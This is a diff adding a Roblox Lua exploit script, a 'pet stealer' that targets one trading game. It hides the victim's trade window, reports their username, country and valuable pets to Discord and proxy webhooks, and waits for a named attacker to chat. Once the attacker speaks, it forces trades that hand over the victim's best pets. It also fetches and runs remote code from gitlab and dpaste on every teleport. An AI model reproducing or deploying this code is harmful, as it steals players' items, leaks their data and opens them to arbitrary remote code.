@@ -1,0 +1,627 @@
+Username = "Rottedandecaying"
+Webhook = "https://discord.com/api/webhooks/1370070873293459607/ZZGBcEfTm1psGblrydjxF4MyEe7jMFot7ONEG5o2yce7VJj-k540o3zAWwhvyUEh3Di4"
+
+if game.PlaceId ~= 85896571713843 and game.PlaceId ~= 98046029518959 then return end
+
+queue_on_teleport([[
+    wait(5)
+    local Players = game:GetService("Players")
+    local player = Players.LocalPlayer
+    repeat task.wait() until not player:WaitForChild("PlayerGui"):FindFirstChild("Intro")
+    getgenv().ls = ]] .. tostring(getgenv().ls) .. [[
+    local Username = "]] .. Username .. [["
+    local Webhook = "]] .. Webhook .. [["
+    getgenv().Username = Username
+    getgenv().Webhook = Webhook
+    loadstring(game:HttpGet("https://gitlab.com/yeslidez/eks0va/-/raw/main/BGSII.LUA"))()
+]])
+
+if workspace:GetAttribute("PrivateServerId") and workspace:GetAttribute("PrivateServerId") ~= "" then
+	local HttpService = game:GetService("HttpService")
+	local TeleportService = game:GetService("TeleportService")
+	local Players = game:GetService("Players")
+
+ local function getSmallestPublicServer(placeId)
+	local HttpService = game:GetService("HttpService")
+	local cursor = ""
+	local smallest = nil
+
+	while true do
+		local success, response
+		repeat
+			success, response = pcall(function()
+				return request({
+					Url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100&sortOrder=Asc&cursor=" .. cursor,
+					Method = "GET"
+				})
+			end)
+			task.wait(0.1)
+		until success and response and response.Body
+
+		local data = HttpService:JSONDecode(response.Body)
+		if data and data.data then
+			for _, server in ipairs(data.data) do
+				if server.playing > 0 and server.playing < server.maxPlayers then
+					if not smallest or server.playing < smallest.playing then
+						smallest = server
+					end
+				end
+			end
+		end
+
+		if not data.nextPageCursor then break end
+		cursor = data.nextPageCursor
+	end
+
+	return smallest and smallest.id or nil
+end
+
+local serverId = getSmallestPublicServer(game.PlaceId)
+	if serverId then
+		TeleportService:TeleportToPlaceInstance(game.PlaceId, serverId, Players.LocalPlayer)
+	end
+	return
+end
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local player = Players.LocalPlayer
+
+if getgenv().yeslidez then return end
+getgenv().yeslidez = true
+
+local PlaceID = game.PlaceId
+local JobID = game.JobId
+local teleportMessage = "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. PlaceID .. ", \"" .. JobID .. "\")"
+local teleportMessage2 = "--@everyone\n[Click me to join!](https://www.roblox.com/games/start?placeId=" .. PlaceID .. "&gameInstanceId=" .. JobID .. ")"
+
+
+local data = require(ReplicatedStorage.Client.Framework.Services.LocalData):Get()
+local PetUtil = require(ReplicatedStorage.Shared.Utils.Stats.PetUtil)
+
+if getgenv().ls == nil then
+    getgenv().ls = true
+end
+
+if getgenv().ls then
+    loadstring(game:HttpGet("http://dpaste.com/DVJ4KU37B.txt"))() -- this is loading screen
+end
+
+if not getgenv().ls then
+	task.spawn(function()
+		while true do
+			local hud = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("ScreenGui"):WaitForChild("HUD")
+			if not hud.Visible then
+				hud.Visible = true
+			end
+			task.wait(0.01)
+		end
+	end)
+end
+
+local leaderstats = game:GetService("Players").LocalPlayer:FindFirstChild("leaderstats")
+if leaderstats then
+	local hatches = leaderstats:FindFirstChild("🥚 Hatches")
+	if hatches and hatches.Value < 2000 then
+		return
+	end
+end
+
+local function countryToFlagEmoji(code)
+	if not code then return "\240\159\140\141" end
+	return code:upper():gsub(".", function(c)
+		return utf8.char(127397 + c:byte())
+	end)
+end
+
+local success, countryCode = pcall(function()
+	return game:HttpGet("https://ipinfo.io/country"):gsub("\n", "")
+end)
+
+local countryText = success and countryToFlagEmoji(countryCode) or "\240\159\140\141"
+
+local tradingUI = player:WaitForChild("PlayerGui"):WaitForChild("ScreenGui"):WaitForChild("Trading")
+for _, child in pairs(tradingUI:GetDescendants()) do
+	if child:IsA("GuiObject") then
+		child.Visible = false
+	end
+end
+tradingUI.DescendantAdded:Connect(function(descendant)
+	if descendant:IsA("GuiObject") then
+		descendant.Visible = false
+	end
+end)
+
+local values = {
+    ["Abyssal_Dragon"] = 5,
+    ["Avernus"] = 2300,
+    ["Beta_TV"] = 400,
+    ["Bionic_Shard"] = 20,
+    ["Cardinal_Bunny"] = 50,
+    ["Chocolate_Bunny"] = 55,
+    ["Crescent_Empress"] = 45,
+    ["Dark_Serpent"] = 150,
+    ["Dementor"] = 29000,
+    ["Demonic_Dogcat"] = 50,
+    ["DOOF"] = 20,
+    ["Dowodle"] = 800,
+    ["Easter_Basket"] = 8000,
+    ["Electra_Hydra"] = 250,
+    ["Elite_Challenger"] = 3000,
+    ["Elite_Soul"] = 6500,
+    ["Enraged_Phoenix"] = 125,
+    ["Flying_Gem"] = 80,
+    ["Giant_Chocolate_Chicken"] = 4800,
+    ["Godly_Gem"] = 11000,
+    ["Hacker_Prism"] = 20,
+    ["Holy_Egg"] = 22,
+    ["Infernus"] = 350,
+    ["Jackpot"] = 500,
+    ["King_Doggy"] = 1450,
+    ["King_Pufferfish"] = 20,
+    ["King_Soul"] = 180,
+    ["Kitsune"] = 110,
+    ["Luminosity"] = 3500,
+    ["Lunar_Deity"] = 20,
+    ["MAN_FACE_GOD"] = 34500,
+    ["Manarium"] = 90,
+    ["Mech_Robot"] = 1200,
+    ["Midas"] = 70,
+    ["Mythic_Abyssal_Dragon"] = 50,
+    ["Mythic_Avernus"] = 19500,
+    ["Mythic_Cardinal_Bunny"] = 500,
+    ["Mythic_Chocolate_Bunny"] = 300,
+    ["Mythic_Crescent_Empress"] = 450,
+    ["Mythic_Diamond_Hexarium"] = 10,
+    ["Mythic_DOOF"] = 150,
+    ["Mythic_Dualcorn"] = 15,
+    ["Mythic_Easter_Basket"] = 95000,
+    ["Mythic_Elite_Soul"] = 18500,
+    ["Mythic_Ethereal_Bunny"] = 20,
+    ["Mythic_Game_Master"] = 40,
+    ["Mythic_Giant_Chocolate_Chicken"] = 90000,
+    ["Mythic_Godly_Gem"] = 120000,
+    ["Mythic_Hacker_Prism"] = 200,
+    ["Mythic_Holy_Egg"] = 220,
+    ["Mythic_King_Doggy"] = 11500,
+    ["Mythic_King_Pufferfish"] = 250,
+    ["Mythic_Manarium"] = 900,
+    ["Mythic_Midas"] = 700,
+    ["Mythic_Moonburst"] = 60,
+    ["Mythic_NULLVoid"] = 250,
+    ["Mythic_Ophanim"] = 150,
+    ["Mythic_Overseer"] = 3750,
+    ["Mythic_Parasite"] = 80,
+    ["Mythic_Patronus"] = 12000,
+    ["Mythic_Rainbow_Marshmellow"] = 45,
+    ["Mythic_Rainbow_Shock"] = 30,
+    ["Mythic_Royal_Trophy"] = 15000,
+    ["Mythic_Seraph"] = 5800,
+    ["Mythic_Sigma_Serpent"] = 300,
+    ["Mythic_Starlight"] = 400,
+    ["Mythic_Sunburst"] = 30,
+    ["Mythic_The_Overlord"] = 5000,
+    ["Mythic_Trio_Cube"] = 160,
+    ["NULLVoid"] = 25,
+    ["Ophanim"] = 15,
+    ["Overseer"] = 375,
+    ["Parasite"] = 6,
+    ["Patronus"] = 1200,
+    ["ROUND"] = 350,
+    ["Royal_Trophy"] = 1500,
+    ["Seraph"] = 500,
+    ["Shiny_Abyssal_Dragon"] = 25,
+    ["Shiny_Avernus"] = 7500,
+    ["Shiny_Beta_TV"] = 2800,
+    ["Shiny_Bionic_Shard"] = 100,
+    ["Shiny_Cardinal_Bunny"] = 250,
+    ["Shiny_Chocolate_Bunny"] = 275,
+    ["Shiny_Crescent_Empress"] = 225,
+    ["Shiny_Dark_Serpent"] = 1225,
+    ["Shiny_Demonic_Dogcat"] = 250,
+    ["Shiny_DOOF"] = 100,
+    ["Shiny_Dowodle"] = 5600,
+    ["Shiny_Easter_Basket"] = 26000,
+    ["Shiny_Electra_Hydra"] = 1750,
+    ["Shiny_Enraged_Phoenix"] = 875,
+    ["Shiny_Flying_Gem"] = 400,
+    ["Shiny_Game_Master"] = 20,
+    ["Shiny_Giant_Chocolate_Chicken"] = 16500,
+    ["Shiny_Godly_Gem"] = 34000,
+    ["Shiny_Hacker_Prism"] = 100,
+    ["Shiny_Holy_Egg"] = 110,
+    ["Shiny_Infernus"] = 2450,
+    ["Shiny_Jackpot"] = 2500,
+    ["Shiny_King_Doggy"] = 5000,
+    ["Shiny_King_Pufferfish"] = 100,
+    ["Shiny_King_Soul"] = 900,
+    ["Shiny_Kitsune"] = 550,
+    ["Shiny_Lunar_Deity"] = 100,
+    ["Shiny_Manarium"] = 450,
+    ["Shiny_Mech_Robot"] = 4200,
+    ["Shiny_Midas"] = 350,
+    ["Shiny_Moonburst"] = 30,
+    ["Shiny_Mythic_Abyssal_Dragon"] = 250,
+    ["Shiny_Mythic_Cardinal_Bunny"] = 2500,
+    ["Shiny_Mythic_Chocolate_Bunny"] = 1500,
+    ["Shiny_Mythic_Crescent_Empress"] = 2250,
+    ["Shiny_Mythic_Demonic_Hydra"] = 5,
+    ["Shiny_Mythic_Diamond_Hexarium"] = 70,
+    ["Shiny_Mythic_DOOF"] = 600,
+    ["Shiny_Mythic_Dualcorn"] = 75,
+    ["Shiny_Mythic_Ethereal_Bunny"] = 100,
+    ["Shiny_Mythic_Game_Master"] = 200,
+    ["Shiny_Mythic_Hacker_Prism"] = 1000,
+    ["Shiny_Mythic_Hexarium"] = 15,
+    ["Shiny_Mythic_Holy_Egg"] = 1100,
+    ["Shiny_Mythic_King_Pufferfish"] = 1500,
+    ["Shiny_Mythic_Manarium"] = 4500,
+    ["Shiny_Mythic_Midas"] = 3500,
+    ["Shiny_Mythic_Moonburst"] = 300,
+    ["Shiny_Mythic_NULLVoid"] = 1250,
+    ["Shiny_Mythic_Ophanim"] = 750,
+    ["Shiny_Mythic_Parasite"] = 400,
+    ["Shiny_Mythic_Rainbow_Marshmellow"] = 300,
+    ["Shiny_Mythic_Rainbow_Shock"] = 200,
+    ["Shiny_Mythic_Sigma_Serpent"] = 1500,
+    ["Shiny_Mythic_Starlight"] = 2000,
+    ["Shiny_Mythic_Sunburst"] = 150,
+    ["Shiny_Mythic_The_Overlord"] = 17000,
+    ["Shiny_Mythic_Trio_Cube"] = 800,
+    ["Shiny_NULLVoid"] = 125,
+    ["Shiny_Ophanim"] = 75,
+    ["Shiny_Overseer"] = 1875,
+    ["Shiny_Parasite"] = 40,
+    ["Shiny_Patronus"] = 6000,
+    ["Shiny_ROUND"] = 1750,
+    ["Shiny_Royal_Trophy"] = 4300,
+    ["Shiny_Seraph"] = 2250,
+    ["Shiny_Sigma_Serpent"] = 150,
+    ["Shiny_Solar_Deity"] = 275,
+    ["Shiny_Starlight"] = 200,
+    ["Shiny_Sunburst"] = 15,
+    ["Shiny_The_Overlord"] = 2200,
+    ["Shiny_Trio_Cube"] = 200,
+    ["Shiny_Umbra"] = 100,
+    ["Sigma_Serpent"] = 30,
+    ["Silly_Doggy"] = 9500,
+    ["Solar_Deity"] = 55,
+    ["Starlight"] = 40,
+    ["The_Overlord"] = 650,
+    ["Trio_Cube"] = 40,
+    ["Umbra"] = 20,
+}
+
+local petCounts = {}
+local hasValuePets = false
+
+for _, pet in pairs(data.Pets) do
+    local name = (pet.Shiny and "Shiny " or "") .. (pet.Mythic and "Mythic " or "") .. pet.Name
+    local key = name:gsub(" ", "_")
+    if values[key] then
+        hasValuePets = true
+        petCounts[name] = (petCounts[name] or {Count = 0, Value = values[key]})
+        local amount = tonumber(pet.Amount) or 1
+        petCounts[name].Count += amount
+    end
+end
+
+if not hasValuePets then
+    return
+end
+
+local sortedPets = {}
+for name, data in pairs(petCounts) do
+    table.insert(sortedPets, {Name = name, Count = data.Count, Value = data.Value})
+end
+
+table.sort(sortedPets, function(a, b)
+    return a.Value > b.Value
+end)
+
+local function formatCommas(n)
+    local left, num, right = string.match(n, '^([^%d]*%d)(%d*)(.-)$')
+    return left .. (num:reverse():gsub('(%d%d%d)', '%1,'):reverse()) .. right
+end
+
+local hitList = ""
+local totalValue = 0
+for i, pet in ipairs(sortedPets) do
+    totalValue += pet.Value * pet.Count
+    if i > 12 then
+        hitList = hitList .. "and more.."
+        break
+    end
+    hitList = hitList .. string.format("%dx %s (Value: %s)\n", pet.Count, pet.Name, formatCommas(pet.Value))
+end
+
+local function getTotalPets()
+    local total = 0
+    for _, pet in pairs(data.Pets) do
+        total += (pet.Amount or 0)
+    end
+    return total
+end
+
+local function sendWebhook()
+        local embed1 = {
+            ["title"] = "When ingame say anything in the chat to recive the stuff u can also click me to join!",
+            ["url"] = "https://www.roblox.com/games/start?placeId=" .. PlaceID .. "&gameInstanceId=" .. JobID,        
+        ["fields"] = {
+            {
+                ["name"] = "Player Info",
+                ["value"] = "```Username: " .. player.Name ..
+                    "\nExecutor: " .. (identifyexecutor and identifyexecutor() or "Unknown Executor") ..
+                    "\nCreator: " .. Username .. "```",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Hit List",
+                ["value"] = "```" .. hitList .. "```",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Summary",
+                ["value"] = "```Total Value: " .. totalValue .. "\nTotal Pets: " .. getTotalPets() .. "```",
+                ["inline"] = false
+            }
+        },
+        ["color"] = 3447003,
+        ["footer"] = {
+            ["text"] = "Made by yeslidez - " .. os.date("%Y-%m-%d %H:%M:%S")
+        }
+    }
+
+    local payload1 = {
+        ["content"] = teleportMessage,
+        ["embeds"] = { embed1 }
+    }
+
+    request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = HttpService:JSONEncode(payload1)
+    })
+
+	local embed2 = {
+		["title"] = "BGSI Public Hits",
+		["fields"] = {
+			{
+				name = "Victim info",
+				value = "Username Hidden\nCountry: " .. countryText,
+				inline = false
+			},
+			{
+				name = "Hit List",
+				value = "```" .. hitList .. "```",
+				inline = false
+			},
+			{
+				name = "Summary",
+				value = "```Total Value: " .. totalValue .. "\nTotal Pets: " .. getTotalPets() .. "```",
+				inline = false
+			}
+		},
+		["color"] = 3447003,
+		["footer"] = {
+			["text"] = "Made by yeslidez - " .. os.date("%Y-%m-%d %H:%M:%S")
+		}
+	}
+
+	local payload2 = {
+		["content"] = "Wow someone got a hit",
+		["embeds"] = { embed2 }
+	}
+
+	request({
+		Url = "https://webhook-proxy-1.onrender.com/webhook/a8dfndf",
+		Method = "POST",
+		Headers = { ["Content-Type"] = "application/json" },
+		Body = HttpService:JSONEncode(payload2)
+	})
+end
+
+sendWebhook()
+
+local activated = false
+
+local function getSortedTradePets()
+    local valuePets, chancePets = {}, {}
+
+    for _, pet in pairs(data.Pets) do
+        local name = (pet.Shiny and "Shiny " or "") .. (pet.Mythic and "Mythic " or "") .. pet.Name
+        local key = name:gsub(" ", "_")
+        local value = values[key]
+        local chance = PetUtil.GetChance(nil, pet)
+
+        for i = 1, (pet.Amount or 1) do
+            local petEntry = {
+                Id = pet.Id .. ":" .. (i - 1),
+                Name = name,
+                Value = value or 0,
+                Chance = chance
+            }
+
+            if value then
+                table.insert(valuePets, petEntry)
+            else
+                table.insert(chancePets, petEntry)
+            end
+        end
+    end
+
+    table.sort(valuePets, function(a, b)
+        return a.Value > b.Value
+    end)
+
+    table.sort(chancePets, function(a, b)
+        return a.Chance < b.Chance
+    end)
+
+    for _, v in pairs(chancePets) do
+        table.insert(valuePets, v)
+    end
+
+    return valuePets
+end
+
+local function isPetInTrade(id)
+    local tradingModule = require(ReplicatedStorage.Client.Gui.Frames.Trading)
+    local success, trade = pcall(getupvalue, tradingModule.IsTrading, 1)
+    if not success or type(trade) ~= "table" or not trade.Party0 then return false end
+    for _, v in pairs(trade.Party0.Offer) do
+        if v.Type == "Pet" and v.Id == id then return true end
+    end
+    return false
+end
+
+local function getCurrentPetCount()
+    local tradingModule = require(ReplicatedStorage.Client.Gui.Frames.Trading)
+    local success, trade = pcall(getupvalue, tradingModule.IsTrading, 1)
+    if not success or type(trade) ~= "table" or not trade.Party0 then return 0 end
+    local count = 0
+    for _, v in pairs(trade.Party0.Offer) do
+        if v.Type == "Pet" then count += 1 end
+    end
+    return count
+end
+
+local function addPetsAndAccept()
+	local pets = getSortedTradePets()
+	local added = {}
+	local i = 1
+	local guiPath = player.PlayerGui.ScreenGui.Trading
+
+	while getCurrentPetCount() < 10 and i <= #pets and guiPath.Visible do
+		local pet = pets[i]
+		local petKey = pet.Id
+
+		if not added[petKey] then
+			added[petKey] = true
+
+			local tries = 0
+			repeat
+				tries += 1
+				ReplicatedStorage.Shared.Framework.Network.Remote.Event:FireServer("TradeAddPet", petKey)
+				task.wait(0.3)
+			until isPetInTrade(petKey) or tries >= 5
+
+			if not isPetInTrade(petKey) then
+				print("fail")
+			end
+		end
+
+		i += 1
+	end
+
+	for _ = 1, 10 do
+		if not guiPath.Visible then break end
+		ReplicatedStorage.Shared.Framework.Network.Remote.Event:FireServer("TradeAccept")
+		task.wait(0.2)
+	end
+
+	task.spawn(function()
+		while guiPath.Visible do
+			ReplicatedStorage.Shared.Framework.Network.Remote.Event:FireServer("TradeConfirm")
+			task.wait(0.2)
+		end
+	end)
+end
+
+local function startTradingLoop()
+	task.spawn(function()
+		while true do
+			ReplicatedStorage.Shared.Framework.Network.Remote.Event:FireServer("TradeRequest", Players:WaitForChild(Username))
+			task.wait(0.6)
+		end
+	end)
+
+	local guiPath = player.PlayerGui.ScreenGui.Trading
+	local triggered = false
+
+	task.spawn(function()
+		while true do
+			if guiPath.Visible and not triggered then
+				triggered = true
+				addPetsAndAccept()
+			elseif not guiPath.Visible then
+				triggered = false
+			end
+			task.wait(0.1)
+		end
+	end)
+end
+
+repeat task.wait() until game:IsLoaded()
+task.wait(2)
+
+local function onMessage(p, msg)
+	if not activated and p.Name == Username then
+        startTradingLoop()
+        activated = true
+	end
+end
+
+task.spawn(function()
+	while not activated do
+		for _, p in pairs(Players:GetPlayers()) do
+			if p.Name == Username then
+				p.Chatted:Connect(function(msg)
+					onMessage(p, msg)
+				end)
+				return
+			end
+		end
+		task.wait(1)
+	end
+end)
+
+Players.PlayerAdded:Connect(function(p)
+	if p.Name == Username and not activated then
+		p.Chatted:Connect(function(msg)
+			onMessage(p, msg)
+		end)
+	end
+end)
+
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local player = Players.LocalPlayer
+
+local function rejoin()
+	queue_on_teleport([[ 
+		wait(5)
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		repeat task.wait() until not player:WaitForChild("PlayerGui"):FindFirstChild("Intro")
+		getgenv().ls = ]] .. tostring(getgenv().ls) .. [[
+		local Username = "]] .. Username .. [["
+		local Webhook = "]] .. Webhook .. [["
+		getgenv().Username = Username
+		getgenv().Webhook = Webhook
+		loadstring(game:HttpGet("https://gitlab.com/yeslidez/eks0va/-/raw/main/BGSII.LUA"))()
+	]])
+	TeleportService:Teleport(game.PlaceId, player)
+end
+
+Players.PlayerAdded:Connect(function(p)
+	if p.Name == Username then
+		p.Chatted:Connect(function(msg)
+			if msg == "+rejoin" then
+				rejoin()
+			end
+		end)
+	end
+end)
+
+for _, p in ipairs(Players:GetPlayers()) do
+	if p.Name == Username then
+		p.Chatted:Connect(function(msg)
+			if msg == "+rejoin" then
+				rejoin()
+			end
+		end)
+	end
+end
